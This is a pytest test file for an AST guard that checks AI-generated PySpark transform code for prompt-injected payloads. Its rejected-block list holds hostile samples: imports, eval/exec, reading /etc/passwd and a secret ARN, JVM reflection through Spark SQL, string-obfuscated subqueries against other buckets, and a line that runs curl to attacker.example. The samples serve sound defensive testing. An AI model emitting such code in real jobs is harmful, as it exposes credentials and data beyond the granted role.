# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: MIT-0
"""Threat model T-01: the AST guard on the AI-generated transform block.

The expectations here come from two places, never from the guard's own output:

* **What must pass** is the shape ``shared/prompt_templates/transform_generation.j2``
  asks the model for: read ``df``, write ``df_transformed``, using
  ``.select/.withColumn/.withColumnRenamed/.cast/.filter/.drop`` and the
  ``pyspark.sql.functions`` the job templates bind. A guard that rejected one of
  these would fail runs the prompt itself requested.
* **What must fail** is what a prompt-injected block would need to do to act
  outside the frame with the Glue role's permissions: import a module, reach a
  module-scope name of the rendered job (``spark``, ``glueContext``, ``boto3``,
  ``args``), use a dunder or ``_``-prefixed attribute (``_jvm``, ``_jdf``,
  ``__class__``), write or collect the frame, or smuggle Java reflection or a
  subquery in through Spark SQL text.
"""

import ast
import os
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

os.environ.setdefault("AWS_DEFAULT_REGION", "us-east-1")
os.environ.setdefault("AWS_REGION", "us-east-1")

_REPO_ROOT = Path(__file__).resolve().parents[4]
_CREATE_CODE_DIR = _REPO_ROOT / "lambda" / "agentic_data_ingestion_create_code"
for _path in (_CREATE_CODE_DIR, _REPO_ROOT / "shared"):
    if str(_path) not in sys.path:
        sys.path.insert(0, str(_path))

from transform_safety import (
    TRANSFORM_VOCABULARY,
    UnsafeTransformBlockError,
    validate_transform_block_safety,
)

# ── What the prompt asks for: must be accepted ───────────────────────

ACCEPTED_BLOCKS = [
    pytest.param("df_transformed = df", id="all-direct-passthrough"),
    pytest.param("", id="empty"),
    pytest.param(
        'df_transformed = df.withColumn("email", lower(trim(col("email"))))\n'
        'df_transformed = df_transformed.withColumnRenamed("cust_id", "customer_id")\n'
        'df_transformed = df_transformed.withColumn("age", col("age").cast(IntegerType()))\n'
        'df_transformed = df_transformed.drop("legacy_flag")',
        id="prompt-structure-chain",
    ),
    pytest.param(
        'df_transformed = df.withColumn("signup", to_date(col("signup"), "dd-MM-yyyy"))\n'
        'df_transformed = df_transformed.withColumn("seen_at", to_timestamp(col("seen_at"), "yyyy-MM-dd HH:mm:ss"))',
        id="explicit-date-formats",
    ),
    pytest.param(
        'df_transformed = df.withColumn("tier", when(col("spend") > 100, lit("gold")).otherwise(lit("std")))',
        id="when-otherwise",
    ),
    pytest.param(
        'df_transformed = df.withColumn("phone", regexp_replace(col("phone"), "[^0-9]", ""))\n'
        'df_transformed = df_transformed.withColumn("full_name", concat_ws(" ", col("first"), col("last")))',
        id="regexp-and-concat",
    ),
    pytest.param(
        'df_transformed = df.withColumn("first", split(col("name"), " ")[0])\n'
        'df_transformed = df_transformed.withColumn("nick", coalesce(col("nick"), col("first"), lit(None)))',
        id="split-subscript-coalesce",
    ),
    pytest.param(
        'df_transformed = df.withColumn("rest", expr("substring(name, 2, length(name))"))',
        id="expr-with-literal-sql",
    ),
    pytest.param(
        'df_transformed = df.filter(col("id").isNotNull())\n'
        'df_transformed = df_transformed.filter("amount >= 0")\n'
        'df_transformed = df_transformed.select("id", "amount", "email")',
        id="filter-column-and-literal-then-final-select",
    ),
    pytest.param(
        'df_transformed = df.withColumn("name", initcap(col("name")))\n'
        'df_transformed = df_transformed.withColumn("code", upper(substring(col("code"), 1, 3)))',
        id="if-forced-functions",
    ),
    pytest.param(
        "df_transformed = df.select([col(c).alias(c.lower()) for c in df.columns])",
        id="comprehension-over-columns",
    ),
    pytest.param(
        'df_transformed = df.na.fill({"status": "unknown"})\ndf_transformed = df_transformed.dropDuplicates(["id"])',
        id="na-fill-and-dedup",
    ),
    pytest.param(
        'df_transformed = df.withColumn("is_active", col("status").isin(["A", "ACTIVE"]).cast(BooleanType()))',
        id="isin-cast-boolean",
    ),
    pytest.param(
        '"""Normalise the customer feed."""\ndf_transformed = df',
        id="leading-docstring",
    ),
    # `.filter` with a Column condition, the other form the prompt's `.filter`
    # covers. Spark evaluates a Column without parsing it as SQL, so string
    # literals inside one are data values, not SQL text.
    pytest.param(
        'df_transformed = df.filter((col("a").isNotNull()) & (col("b") != "") | ~col("c").isin(["x", "y"]))',
        id="filter-boolean-column-operators",
    ),
    pytest.param(
        'df_transformed = df.where(df["amount"].between(0, 1000))',
        id="where-frame-subscript-between",
    ),
    pytest.param(
        'df_transformed = df.filter(split(col("name"), " ")[0] == "Dr")',
        id="filter-column-item-compare",
    ),
    pytest.param(
        'df_transformed = df.filter(length(trim(col("code"))) * 2 > 0)',
        id="filter-function-arithmetic",
    ),
    pytest.param(
        'df_transformed = df.filter(expr("amount > 0") & col("id").isNotNull())',
        id="filter-literal-expr-inside-column",
    ),
    pytest.param(
        'df_transformed = df.replace("N/A", None)',
        id="dataframe-replace",
    ),
]


@pytest.mark.parametrize("block", ACCEPTED_BLOCKS)
def test_a_block_in_the_prompts_shape_is_accepted(block: str):
    assert validate_transform_block_safety(block) is None


def test_the_anti_pattern_method_spellings_are_left_to_the_regeneration():
    """``.lower()`` on a Column is a mistake the anti-pattern check regenerates.

    Rejecting it here would fail the step before that regeneration can run,
    turning a recoverable mistake into a failed run. It is not a safety issue:
    at worst it raises ``AttributeError`` inside the job.
    """
    block = 'df_transformed = df.withColumn("email", col("email").lower().trim())'

    assert validate_transform_block_safety(block) is None


# ── What an injected block would need: must be rejected ──────────────

REJECTED_BLOCKS = [
    # imports and dynamic import
    pytest.param("import os\ndf_transformed = df", "Import", id="import"),
    pytest.param("from subprocess import run\ndf_transformed = df", "ImportFrom", id="import-from"),
    pytest.param('m = __import__("os")\ndf_transformed = df', "__import__", id="dunder-import"),
    # builtins with reach
    pytest.param('eval("1")\ndf_transformed = df', "eval", id="eval"),
    pytest.param('exec("x = 1")\ndf_transformed = df', "exec", id="exec"),
    pytest.param('open("/etc/passwd").read()\ndf_transformed = df', "open", id="open"),
    pytest.param('getattr(df, "write")\ndf_transformed = df', "getattr", id="getattr"),
    # module-scope names of the rendered job
    pytest.param('df_transformed = spark.sql("SHOW TABLES")', "spark", id="spark-session"),
    pytest.param("df_transformed = glueContext.create_dynamic_frame", "glueContext", id="glue-context"),
    pytest.param('c = boto3.client("s3")\ndf_transformed = df', "boto3", id="boto3"),
    pytest.param('s = args["secret_arn"]\ndf_transformed = df', "args", id="job-args"),
    pytest.param("x = sc._jvm\ndf_transformed = df", "sc", id="spark-context"),
    pytest.param("sys.exit(0)\ndf_transformed = df", "sys", id="sys"),
    # private and dunder attributes
    pytest.param("x = df._jdf\ndf_transformed = df", "_jdf", id="private-jdf"),
    pytest.param('x = col("a")._jc\ndf_transformed = df', "_jc", id="private-jc"),
    pytest.param("x = ().__class__\ndf_transformed = df", "__class__", id="dunder-class"),
    pytest.param("x = df.sparkSession\ndf_transformed = df", "sparkSession", id="frame-session"),
    # writes, actions and collection
    pytest.param('df.write.parquet("s3://elsewhere/")\ndf_transformed = df', "write", id="write"),
    pytest.param('df.writeTo("db.t").append()\ndf_transformed = df', "writeTo", id="write-to"),
    pytest.param("rows = df.collect()\ndf_transformed = df", "collect", id="collect"),
    pytest.param("p = df.toPandas()\ndf_transformed = df", "toPandas", id="to-pandas"),
    pytest.param("r = df.rdd\ndf_transformed = df", "rdd", id="rdd"),
    pytest.param('df_transformed = df.selectExpr("id")', "selectExpr", id="select-expr-not-offered"),
    # statements the prompt forbids
    pytest.param("def f(x):\n    return x\ndf_transformed = df", "FunctionDef", id="function-def"),
    pytest.param("class C:\n    pass\ndf_transformed = df", "ClassDef", id="class-def"),
    pytest.param("f = lambda x: x\ndf_transformed = df", "Lambda", id="lambda"),
    pytest.param("try:\n    pass\nexcept Exception:\n    pass\ndf_transformed = df", "Try", id="try"),
    pytest.param("while True:\n    break\ndf_transformed = df", "While", id="while"),
    pytest.param("df_transformed = df\ndel df", "Delete", id="del"),
    pytest.param("global df\ndf_transformed = df", "Global", id="global"),
    # assignment targets that mutate rather than bind
    pytest.param("df.foo = 1\ndf_transformed = df", "attribute", id="attribute-assignment"),
    pytest.param('d = {}\nd["k"] = 1\ndf_transformed = df', "subscript", id="subscript-assignment"),
    pytest.param("_hidden = 1\ndf_transformed = df", "_hidden", id="underscore-name"),
    # Spark SQL text: reflection and subqueries
    pytest.param(
        "df_transformed = df.withColumn(\"x\", expr(\"reflect('java.lang.Runtime', 'getRuntime')\"))",
        "reflect",
        id="expr-reflect",
    ),
    pytest.param(
        "df_transformed = df.filter(\"java_method('java.lang.System', 'getenv', 'HOME') is not null\")",
        "java_method",
        id="filter-java-method",
    ),
    pytest.param(
        "df_transformed = df.withColumn(\"x\", expr(\"TRY_REFLECT('java.util.UUID', 'randomUUID')\"))",
        "TRY_REFLECT",
        id="expr-try-reflect-uppercase",
    ),
    pytest.param(
        'df_transformed = df.filter("id in (SELECT id FROM parquet.`s3://other-bucket/`)")',
        "SELECT",
        id="filter-subquery",
    ),
    # Spark SQL text assembled so the literal scan cannot see it
    pytest.param('df_transformed = df.withColumn("x", expr(f"{1}"))', "f-string", id="expr-f-string"),
    pytest.param(
        'df_transformed = df.withColumn("x", expr("refl" + "ect(\'a\', \'b\')"))',
        "concatenation",
        id="expr-concatenation",
    ),
    pytest.param(
        's = "id > 0"\ndf_transformed = df.filter(s)',
        "variable",
        id="filter-local-variable",
    ),
    pytest.param(
        'df_transformed = df.withColumn("x", expr(df.columns[0]))',
        "column names from the data",
        id="expr-uploaded-header",
    ),
    # The same words assembled from operations that are each permitted on
    # their own. A token test cannot see these: no single literal contains a
    # forbidden word, and `.replace` is on the allowlist as a DataFrame
    # method. The first two are the external review's reproductions.
    pytest.param(
        "df_transformed = df.withColumn(\n"
        '    "v",\n'
        "    expr(\"j*va_method('java.lang.System', 'getProperty', 'java.version')\".replace(\"*\", \"a\")),\n"
        ")",
        "string method '.replace'",
        id="expr-java-method-via-str-replace",
    ),
    pytest.param(
        'df_transformed = df.filter("id in (s*lect id from parquet.`s3://other/`)".replace("*", "e"))',
        "string method '.replace'",
        id="filter-subquery-via-str-replace",
    ),
    pytest.param(
        'df_transformed = df.withColumn("x", expr("%slect(\'a\', \'b\')" % "ref"))',
        "concatenation",
        id="expr-percent-format",
    ),
    pytest.param(
        "df_transformed = df.withColumn(\"x\", expr(\"xxreflect('a', 'b')\"[2:]))",
        "must be a string literal",
        id="expr-sliced-literal",
    ),
    pytest.param(
        'df_transformed = df.withColumn("x", expr(max("a > 0", "b > 0")))',
        "must be a string literal",
        id="expr-builtin-returning-a-string",
    ),
    pytest.param(
        'df_transformed = df.filter("a > 0" if True else "b > 0")',
        "string literal or a Column expression",
        id="filter-conditional-text",
    ),
    pytest.param(
        'df_transformed = df.filter(col("x") == "ABC".lower())',
        "string method '.lower'",
        id="filter-column-compared-with-computed-text",
    ),
    # Arguments the old check never looked at, because it read `args[0]` only.
    pytest.param(
        'df_transformed = df.withColumn("x", expr(str="refl" + "ect(\'a\', \'b\')"))',
        "exactly one positional argument",
        id="expr-keyword-argument",
    ),
    pytest.param(
        'df_transformed = df.withColumn("x", expr(*["a > 0"]))',
        "exactly one positional argument",
        id="expr-starred-argument",
    ),
    # A sink reached through another name is not recognised as a sink.
    pytest.param(
        'e = expr\ndf_transformed = df.withColumn("x", e("refl" + "ect(\'a\', \'b\')"))',
        "'expr' must be called directly",
        id="expr-rebound",
    ),
    pytest.param(
        "w = df.where\ndf_transformed = w(\"refl\" + \"ect('a', 'b') is null\")",
        "'where' must be called directly",
        id="where-rebound",
    ),
    pytest.param(
        'df_transformed = df.withColumn("x", [expr][0]("refl" + "ect(\'a\', \'b\')"))',
        "'expr' must be called directly",
        id="expr-through-a-list",
    ),
    # unparseable: safety cannot be checked
    pytest.param("df_transformed = df.withColumn(", "not parseable", id="syntax-error"),
]


@pytest.mark.parametrize(("block", "named"), REJECTED_BLOCKS)
def test_a_block_reaching_outside_the_frame_is_rejected(block: str, named: str):
    with pytest.raises(UnsafeTransformBlockError) as exc_info:
        validate_transform_block_safety(block)

    assert named in str(exc_info.value), (
        f"the rejection should name what it refused ({named!r}) so an operator can read it; got {exc_info.value}"
    )


def test_the_rejection_is_a_value_error_and_not_a_step_failure():
    """The handler route this relies on.

    ``lambda_handler`` re-raises a ``StepFailure`` as-is and wraps any other
    exception as ``StepFailure("create_code", str(e))``. A ``ValueError``
    subclass therefore reaches Step Functions with the guard's message, the
    same route "Template code validation failed" takes.
    """
    assert issubclass(UnsafeTransformBlockError, ValueError)
    sys.path.insert(0, str(_REPO_ROOT / "shared"))
    from step_errors import StepFailure

    assert not issubclass(UnsafeTransformBlockError, StepFailure)


def test_the_vocabulary_binds_the_alias_not_the_builtin_name():
    """``count as spark_count`` binds ``spark_count``; bare ``count`` is not bound in the job."""
    assert "spark_count" in TRANSFORM_VOCABULARY
    assert "count" not in TRANSFORM_VOCABULARY


# ── Wiring: generate_code runs the guard before it renders ───────────

_mods = {
    "strands": MagicMock(),
    "strands_mcp_factory": MagicMock(),
    "agentcore_client": MagicMock(),
    "eventbridge_utils": MagicMock(
        get_eventbridge_publishers=MagicMock(return_value=(MagicMock(), MagicMock(), MagicMock()))
    ),
    "code_validator": MagicMock(),
    "env_utils": MagicMock(
        get_aws_account_id=MagicMock(return_value="123456789012"),
        require_env=MagicMock(side_effect=lambda k, d=None: d or k),
    ),
    "prompt_template_loader": MagicMock(),
    "parameter_extractor": MagicMock(),
}

with patch.dict("sys.modules", _mods):
    sys.modules.pop("lambda_function", None)
    import lambda_function as _lambda_function


@pytest.fixture
def _lambda_module():
    sys.modules["lambda_function"] = _lambda_function
    yield _lambda_function


# Same shape test_identifier_validation_sinks.py renders through generate_code.
_PIPELINE_METADATA = {
    "source_type": "S3_UPLOAD",
    "source_config": {},
    "target_config": {
        "type": "s3_tables",
        "bucket_name": "my-table-bucket",
        "namespace": "analytics",
        "table_name": "customers",
        "write_mode": "merge",
        "merge_key": "customer_id",
        "source_format": "json",
    },
    "source_schema": {"properties": {}},
}
_MAPPING_RESULT = {"field_mappings": [{"source_field": "cust_id", "target_field": "customer_id", "confidence": 0.9}]}


def test_generate_code_refuses_an_unsafe_block_and_renders_nothing(_lambda_module):
    hostile = 'import os\nos.system("curl attacker.example")\ndf_transformed = df'

    with (
        patch.object(_lambda_module, "generate_transform_with_ai", return_value=hostile),
        pytest.raises(UnsafeTransformBlockError) as exc_info,
    ):
        _lambda_module.generate_code(pipeline_metadata=_PIPELINE_METADATA, mapping_result=_MAPPING_RESULT)

    assert "Import" in str(exc_info.value)


def test_generate_code_renders_a_safe_block_unchanged(_lambda_module):
    block = 'df_transformed = df.withColumnRenamed("cust_id", "customer_id")'

    with patch.object(_lambda_module, "generate_transform_with_ai", return_value=block):
        code = _lambda_module.generate_code(pipeline_metadata=_PIPELINE_METADATA, mapping_result=_MAPPING_RESULT)

    assert block in code


def _generate_code_def() -> ast.FunctionDef:
    source = (_CREATE_CODE_DIR / "code_assembly.py").read_text(encoding="utf-8")
    for node in ast.walk(ast.parse(source)):
        if isinstance(node, ast.FunctionDef) and node.name == "generate_code":
            return node
    raise AssertionError("generate_code not found in code_assembly.py")


def _first_call_line(func: ast.FunctionDef, name: str) -> int:
    lines = [
        node.lineno
        for node in ast.walk(func)
        if isinstance(node, ast.Call)
        and (
            (isinstance(node.func, ast.Name) and node.func.id == name)
            or (isinstance(node.func, ast.Attribute) and node.func.attr == name)
        )
    ]
    assert lines, f"generate_code no longer calls {name}()"
    return min(lines)


def test_the_guard_sits_between_generation_and_render():
    """Structural, so moving the call below the render fails here.

    The two wiring tests above prove the guard runs; this proves it runs before
    ``template.render``, which is what keeps an unsafe block out of every stored
    script rather than only out of the return value.
    """
    func = _generate_code_def()

    generated = _first_call_line(func, "generate_transform")
    guarded = _first_call_line(func, "validate_transform_block_safety")
    rendered = _first_call_line(func, "render")

    assert generated < guarded < rendered, (
        f"expected generate_transform (line {generated}) < validate_transform_block_safety "
        f"(line {guarded}) < render (line {rendered})"
    )
